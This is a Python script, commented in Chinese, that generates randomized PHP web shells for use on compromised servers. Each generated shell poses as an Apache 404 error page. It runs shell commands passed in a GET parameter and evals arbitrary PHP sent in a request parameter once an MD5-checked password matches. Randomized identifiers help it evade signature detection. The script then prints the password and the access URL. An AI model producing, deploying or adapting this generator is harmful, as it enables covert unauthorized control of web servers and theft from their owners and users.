import random
import hashlib
import string


def random_string(length=8):
    """
    生成固定长度的随机字符串，确保不是数字开头。
    """
    if length < 1:
        raise ValueError("长度必须大于0")

    # 确保第一个字符不是数字
    first_char = random.choice(string.ascii_letters)  # 随机选择一个字母
    remaining_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))

    return first_char + remaining_chars


def generate_random_string(max_length=8):
    """
    生成一个包含大小写字母的随机字符串，长度在1到max_length位之间。

    :param max_length: 最大长度（默认为8）
    :return: 随机字符串
    """
    if max_length < 1 or max_length > 8:
        raise ValueError("长度必须在1到8之间")

    length = random.randint(1, max_length)  # 随机选择长度
    letters = string.ascii_letters  # 包含所有大小写字母
    return ''.join(random.choice(letters) for _ in range(length))

def generate_php_script():
    # 随机生成变量名和哈希值
    cmd_var = random_string()
    php_var = random_string()
    original_random_string = random_string(10)  # 用于生成哈希的原始随机字符串
    hash_value = hashlib.md5(original_random_string.encode()).hexdigest()
    custom_eval_func = random_string()
    a_func = random_string()
    php_pass = random_string()
    var_str = generate_random_string()
    var_a = generate_random_string()
    var_code = generate_random_string()
    var_info = generate_random_string()
    # PHP 脚本模板，替换为随机值
    php_script = f"""<?php
ob_start(); 
echo "<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
</body>
</html>
<br/>
<br/>";
${var_info} = ob_get_contents();
ob_end_clean();

if (isset($_GET['{cmd_var}'])) {{
    ${var_str} = $_GET['{cmd_var}'];
}}

if (isset($_GET['{php_var}']) && hash('md5', $_GET['{php_var}']) == '{hash_value}') {{
    {custom_eval_func}({a_func}()); // MD5匹配，执行函数
}}

echo " ${var_info}  <br> <br>  ";

// 原始随机字符串: {original_random_string}，用于生成哈希值
function {custom_eval_func}(${var_code}) {{
    eval(${var_code}); // 使用自定义函数名调用 eval
}}

function {a_func}() {{
    ${var_a} = $_REQUEST["{php_pass}"];
    return ${var_a};
}}

print `${var_str}`;
?>"""

    return php_script, cmd_var, php_var, hash_value, original_random_string,php_pass


# 生成 PHP 脚本
php_script, cmd_param, php_param, md5_hash, original_random_string,php_pass = generate_php_script()

# 输出生成的 PHP 脚本和参数
print("生成的 PHP 脚本:")
print(php_script)
print("\n使用的参数:")
print(f"cmd 参数名: {cmd_param}")
print(f"php 参数名: {php_param}")
print(f"MD5 哈希值: {md5_hash}")
print(f"生成哈希的原始随机字符串: {original_random_string}")
print(f"密码是: {php_pass}")
print(f"链接url是：http://x.x.x.x/shell.php?{php_param}={original_random_string}")
